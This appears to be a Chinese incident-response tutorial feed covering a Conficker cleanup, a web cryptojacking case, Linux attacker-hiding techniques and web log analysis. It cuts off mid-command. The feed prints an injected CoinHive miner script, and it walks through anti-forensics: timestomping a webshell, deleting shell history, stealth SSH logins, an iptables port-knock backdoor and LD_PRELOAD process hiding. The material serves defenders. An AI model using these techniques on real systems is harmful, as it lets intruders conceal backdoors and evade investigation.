        <content type="html"><![CDATA[<h2 id="第2篇：蠕虫病毒">第2篇：蠕虫病毒</h2><h3 id="0x00-前言">0x00 前言</h3><p>​蠕虫病毒是一种十分古老的计算机病毒，它是一种自包含的程序（或是一套程序），通常通过网络途径传播，每入侵到一台新的计算机，它就在这台计算机上复制自己，并自动执行它自身的程序。</p><p>常见的蠕虫病毒：熊猫烧香病毒 、冲击波/震荡波病毒、conficker病毒等。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​某天早上，管理员在出口防火墙发现内网服务器不断向境外IP发起主动连接，内网环境，无法连通外网，无图脑补。</p><h3 id="0x02-事件分析">0x02 事件分析</h3><p>在出口防火墙看到的服务器内网IP，首先将中病毒的主机从内网断开，然后登录该服务器，打开D盾_web查杀查看端口连接情况，可以发现本地向外网IP发起大量的主动连接：</p><p><img src="image/win-6-1.png" alt=""></p><p>通过端口异常，跟踪进程ID，可以找到该异常由svchost.exe windows服务主进程引起，svchost.exe向大量远程IP的445端口发送请求：</p><p><img src="image/win-6-2.png" alt=""></p><p>这里我们推测可以系统进程被病毒感染，使用卡巴斯基病毒查杀工具，对全盘文件进行查杀，发现c:\windows\system32\qntofmhz.dll异常：</p><p><img src="image/win-6-3.png" alt=""></p><p>使用多引擎在线病毒扫描（<a href="http://www.virscan.org/%EF%BC%89">http://www.virscan.org/）</a> 对该文件进行扫描:</p><p><img src="image/win-6-4.png" alt=""></p><p>确认服务器感染conficker蠕虫病毒，下载conficker蠕虫专杀工具对服务器进行清查，成功清楚病毒。</p><p><img src="image/win-6-5.png" alt=""></p><p>大致的处理流程如下:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、发现异常：出口防火墙、本地端口连接情况，主动向外网发起大量连接</span><br><span class="line">2、病毒查杀：卡巴斯基全盘扫描，发现异常文件</span><br><span class="line">3、确认病毒：使用多引擎在线病毒对该文件扫描，确认服务器感染conficker蠕虫病毒。</span><br><span class="line">4、病毒处理：使用conficker蠕虫专杀工具对服务器进行清查，成功清除病毒。</span><br></pre></td></tr></table></figure><h3 id="0x04-预防处理措施">0x04 <strong>预防处理措施</strong></h3><p>​在政府、医院内网，依然存在着一些很古老的感染性病毒，如何保护电脑不受病毒感染，总结了几种预防措施：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、安装杀毒软件，定期全盘扫描</span><br><span class="line">2、不使用来历不明的软件，不随意接入未经查杀的U盘</span><br><span class="line">3、定期对windows系统漏洞进行修复，不给病毒可乘之机</span><br><span class="line">4、做好重要文件的备份，备份，备份。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第06章：Web实战篇第2篇：门罗币恶意挖矿</title>
      <link href="/posts/3ed12ca6.html"/>
      <url>/posts/3ed12ca6.html</url>
      
        <content type="html"><![CDATA[<h2 id="第2篇：门罗币恶意挖矿">第2篇：门罗币恶意挖矿</h2><p>门罗币(Monero 或 XMR)，它是一个非常注重于隐私、匿名性和不可跟踪的加密数字货币。只需在网页中配置好js脚本，打开网页就可以挖矿，是一种非常简单的挖矿方式，而通过这种恶意挖矿获取数字货币是黑灰色产业获取收益的重要途径。</p><h3 id="现象描述">现象描述</h3><p>利用XMR恶意挖矿，会大量占用用户的CPU资源，严重影响了网站的用户体验。</p><p>从08/09日0点开始，局域网内某IP访问网站页面会触发安全预警，只要访问此服务器上的网页，CPU直线上升100%</p><p><img src="./image/2-5.jpg" alt=""></p><h3 id="问题解析">问题解析</h3><p>通过获取恶意网页url，对网页页面进行分析，发现网站页面被植入在线门罗币挖矿代码：</p><p><code>&lt;script&gt;       var script = document.createElement('script');       script.onload = function () &#123;           // XMR Pool hash   var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu');          // TODO: Replace the below string with wallet string   m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK');       &#125;;       script.src = 'https://coinhive.com/lib/coinhive.min.js';       document.head.appendChild(script);   &lt;/script&gt;  </code></p><p>删除js里面的恶意代码，网站被XMR 恶意挖矿，服务器已经被攻击，进一步做服务器入侵排查。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第05章：Linux权限维持 隐藏篇</title>
      <link href="/posts/bca12e93.html"/>
      <url>/posts/bca12e93.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p><h3 id="0x01-隐藏文件">0x01 隐藏文件</h3><p>Linux 下创建一个隐藏文件：<code>touch  .test.txt</code></p><p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418510.png" alt=""></p><p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p><p>这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p><h3 id="0x02-隐藏文件时间戳">0x02 隐藏文件时间戳</h3><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p><p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p><p>利用方法</p><p>touch -r index.php webshell.php</p><p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p><p>touch -t 1401021042.30 webshell.php</p><h3 id="0x03-隐藏权限">0x03 隐藏权限</h3><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p><p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> evil<span class="selector-class">.php</span> 锁定文件</span><br><span class="line">lsattr  evil<span class="selector-class">.php</span>   属性查看</span><br><span class="line">chattr -<span class="selector-tag">i</span> evil<span class="selector-class">.php</span> 解除锁定</span><br><span class="line">rm -rf <span class="number">1</span><span class="selector-class">.evil</span><span class="selector-class">.php</span>  删除文件</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406131418337.png" alt=""></p><h3 id="0x04-隐藏历史操作命令">0x04 隐藏历史操作命令</h3><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p><p>技巧一：只针对你的工作关闭历史记录</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="literal">space</span>]<span class="keyword">set</span> +o history</span><br><span class="line">备注：[<span class="literal">space</span>] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure><p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p><p>要重新开启历史功能，执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]<span class="built_in">set</span> -o <span class="built_in">history</span></span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure><p>技巧二：从历史记录中删除指定的命令</p><p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">history</span> | <span class="keyword">grep</span> <span class="string">&quot;keyword&quot;</span></span><br></pre></td></tr></table></figure><p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">history</span> -d<span class="meta"> [num]</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406131418497.png" alt=""></p><p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sed</span> -i <span class="string">&#x27;150,<span class="variable">$d</span>&#x27;</span> .bash_history</span><br></pre></td></tr></table></figure><h3 id="0x05-隐藏远程SSH登陆记录">0x05 隐藏远程SSH登陆记录</h3><p>#隐身登录系统，不会被w、who、last等指令检测到。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -T root@<span class="number">127.0.0.1</span> /bin/bash -i</span><br></pre></td></tr></table></figure><p>不记录ssh公钥在本地.ssh目录中</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=<span class="regexp">/dev/</span><span class="keyword">null</span> -T user@host <span class="regexp">/bin/</span>bash –i</span><br></pre></td></tr></table></figure><h3 id="0x06-端口复用">0x06 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p><p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装SSLH</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install sslh</span><br><span class="line"><span class="comment">#配置SSLH</span></span><br><span class="line">编辑 SSLH 配置文件：</span><br><span class="line">sudo vi /etc/default/sslh</span><br><span class="line">1、找到下列行：<span class="attribute">Run</span>=<span class="literal">no</span>  将其修改为：<span class="attribute">Run</span>=<span class="literal">yes</span></span><br><span class="line">2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443</span><br><span class="line"><span class="attribute">DAEMON_OPTS</span>=<span class="string">&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;</span></span><br></pre></td></tr></table></figure><p>第二种方式：利用IPTables进行端口复用</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 端口复用链</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span> -<span class="string">N</span> <span class="string">LETMEIN</span></span><br><span class="line"><span class="comment"># 端口复用规则</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span>  -<span class="string">A</span> <span class="string">LETMEIN</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">j</span> <span class="string">REDIRECT</span> <span class="built_in">--to-port</span> <span class="string">22</span></span><br><span class="line"><span class="comment"># 开启开关</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">A</span> <span class="string">INPUT</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">m</span> <span class="string">string</span> <span class="built_in">--string</span> <span class="string">&#x27;threathuntercoming&#x27;</span> <span class="built_in">--algo</span> <span class="string">bm</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--set</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--rsource</span> -<span class="string">j</span> <span class="string">ACCEPT</span></span><br><span class="line"><span class="comment"># 关闭开关</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">A</span> <span class="string">INPUT</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">m</span> <span class="string">string</span> <span class="built_in">--string</span> <span class="string">&#x27;threathunterleaving&#x27;</span> <span class="built_in">--algo</span> <span class="string">bm</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--remove</span> -<span class="string">j</span> <span class="string">ACCEPT</span></span><br><span class="line"><span class="comment"># let&#x27;s do it</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span> -<span class="string">A</span> <span class="string">PREROUTING</span> -<span class="string">p</span> <span class="string">tcp</span> <span class="built_in">--dport</span> <span class="string">80</span> <span class="built_in">--syn</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--rcheck</span> <span class="built_in">--seconds</span> <span class="string">3600</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--rsource</span> -<span class="string">j</span> <span class="string">LETMEIN</span></span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启复用</span></span><br><span class="line"><span class="attribute">echo</span> threathuntercoming | socat - tcp:<span class="number">192.168.28.128:80</span></span><br><span class="line"><span class="comment">#ssh使用80端口进行登录</span></span><br><span class="line"><span class="attribute">ssh</span> -p <span class="number">80</span> root@<span class="number">192.168.28.128</span></span><br><span class="line"><span class="comment">#关闭复用</span></span><br><span class="line"><span class="attribute">echo</span> threathunterleaving | socat - tcp:<span class="number">192.168.28.128:80</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406131418523.png" alt=""></p><p>具体文章详见：<a href="https://www.freebuf.com/articles/network/137683.html">远程遥控 IPTables 进行端口复用</a></p><h3 id="0x07-进程隐藏">0x07 进程隐藏</h3><p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p><p>第一种方法：libprocesshider</p><p>github项目地址：<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p><p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载程序编译</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gianlucaborello/libprocesshider.git</span><br><span class="line"><span class="built_in">cd</span> libprocesshider/ &amp;&amp; make</span><br><span class="line"><span class="comment"># 移动文件到/usr/local/lib/目录下</span></span><br><span class="line"><span class="built_in">cp</span> libprocesshider.so /usr/local/lib/</span><br><span class="line"><span class="comment"># 把它加载到全局动态连接局</span></span><br><span class="line"><span class="built_in">echo</span> /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure><p>测试：运行 evil_script.py，</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418927.png" alt=""></p><p>此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418195.png" alt=""></p><p>如何在Linux中发现隐藏的进程，</p><p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p><p>下载地址：<a href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">sudo yum <span class="keyword">install</span> unhide</span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure><p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418073.png" alt=""></p><p>第二种方法：进程注入工具linux-inject</p><p>linux-inject是用于将共享对象注入Linux进程的工具</p><p>github项目地址： <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载程序编译</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gaffe23/linux-inject.git</span><br><span class="line"><span class="built_in">cd</span> linux-inject &amp;&amp; make</span><br><span class="line"><span class="comment"># 测试进程</span></span><br><span class="line">./sample-target</span><br><span class="line"><span class="comment"># 进程注入</span></span><br><span class="line">./inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>验证进程注入成功，如下图所示：</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131418231.png" alt=""></p><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p><p>下载地址：<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载解压</span></span><br><span class="line"><span class="attribute">wget</span> https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-<span class="number">1</span>-beta/cymothoa-<span class="number">1</span>-beta.tar.gz</span><br><span class="line"><span class="attribute">tar</span> zxvf cymothoa-<span class="number">1</span>-beta.tar.gz </span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="attribute">cd</span> cymothoa-<span class="number">1</span>-beta &amp;&amp; make</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-结语">0x07 结语</h3><p>本文主要介绍了Linux下的几种隐藏技术，包括隐藏文件、隐藏权限、隐藏历史操作命令、端口复用、进程隐藏等方面的技巧。仅作抛砖引玉之用，欢迎留言分享。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第02章：日志分析篇第3篇：Web日志分析</title>
      <link href="/posts/893fe81c.html"/>
      <url>/posts/893fe81c.html</url>
      
        <content type="html"><![CDATA[<h2 id="第3篇-Web日志分析">第3篇:Web日志分析</h2><h3 id="ox01-Web日志">ox01  Web日志</h3><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p><p>我们来看一条Apache的访问日志：</p><p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p><p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p><p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p><h3 id="0x02-日志分析技巧">0x02 日志分析技巧</h3><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p><p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p><p>常用分析工具：</p><p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析。</p><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p><p>Apache日志分析技巧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line"><span class="built_in">cut</span> -d- -f 1 log_file|<span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -rn | <span class="built_in">head</span> -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> log_file|<span class="built_in">sort</span>|<span class="built_in">uniq</span>|<span class="built_in">wc</span> -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep <span class="string">&quot;/index.php&quot;</span> log_file | <span class="built_in">wc</span> -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk <span class="string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27;</span> log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk <span class="string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27;</span> log_file | <span class="built_in">sort</span> -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk <span class="string">&#x27;&#123;print $1,$7&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk <span class="string">&#x27;&#123;print $12,$1&#125;&#x27;</span> log_file | grep ^\&quot;Mozilla | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> |<span class="built_in">sort</span> | <span class="built_in">uniq</span> | <span class="built_in">wc</span> -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk <span class="string">&#x27;&#123;print $4,$1&#125;&#x27;</span> log_file | grep 21/Jun/2018:14 | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>| <span class="built_in">sort</span> | <span class="built_in">uniq</span> | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure><h3 id="0x03-日志分析案例">0x03 日志分析案例</h3><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p><p>1、定位攻击源</p><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-3-1.png" alt=""></p><p>浏览器指纹：</p><p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p><p>2、搜索相关日志记录</p><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-3-2.png" alt=""></p><p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">A</span>、攻击者访问首页和登录页</span><br><span class="line"><span class="variable">B</span>、攻击者访问<span class="variable">MsgSjlb</span><span class="operator">.</span><span class="variable">aspx</span>和<span class="variable">MsgSebd</span><span class="operator">.</span><span class="variable">aspx</span></span><br><span class="line"><span class="built_in">C</span>、攻击者访问<span class="variable">Xzuser</span><span class="operator">.</span><span class="variable">aspx</span></span><br><span class="line"><span class="built_in">D</span>、攻击者多次<span class="variable">POST</span>（怀疑通过这个页面上传模块缺陷）</span><br><span class="line"><span class="built_in">E</span>、攻击者访问了图片木马</span><br></pre></td></tr></table></figure><p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p><h3 id="0x04-日志统计分析技巧">0x04 日志统计分析技巧</h3><p>统计爬虫：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&#x27;Googlebot|Baiduspider&#x27;</span>  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span> | sort | uniq</span><br></pre></td></tr></table></figure><p>统计浏览器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep -v -E <span class="string">&#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">100</span></span><br></pre></td></tr></table></figure><p>IP 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;23/May/2019&#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">10</span></span><br><span class="line">   <span class="number">2206</span> <span class="number">219.136</span><span class="number">.134</span><span class="number">.13</span></span><br><span class="line">   <span class="number">1497</span> <span class="number">182.34</span><span class="number">.15</span><span class="number">.248</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">211.140</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">119.145</span><span class="number">.149</span><span class="number">.106</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">61.183</span><span class="number">.15</span><span class="number">.179</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">218.6</span><span class="number">.8</span><span class="number">.189</span></span><br><span class="line">   <span class="number">1422</span> <span class="number">124.232</span><span class="number">.150</span><span class="number">.171</span></span><br><span class="line">   <span class="number">1421</span> <span class="number">106.187</span><span class="number">.47</span><span class="number">.224</span></span><br><span class="line">   <span class="number">1420</span> <span class="number">61.160</span><span class="number">.220</span><span class="number">.252</span></span><br><span class="line">   <span class="number">1418</span> <span class="number">114.80</span><span class="number">.201</span><span class="number">.18</span></span><br></pre></td></tr></table></figure><p>统计网段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print 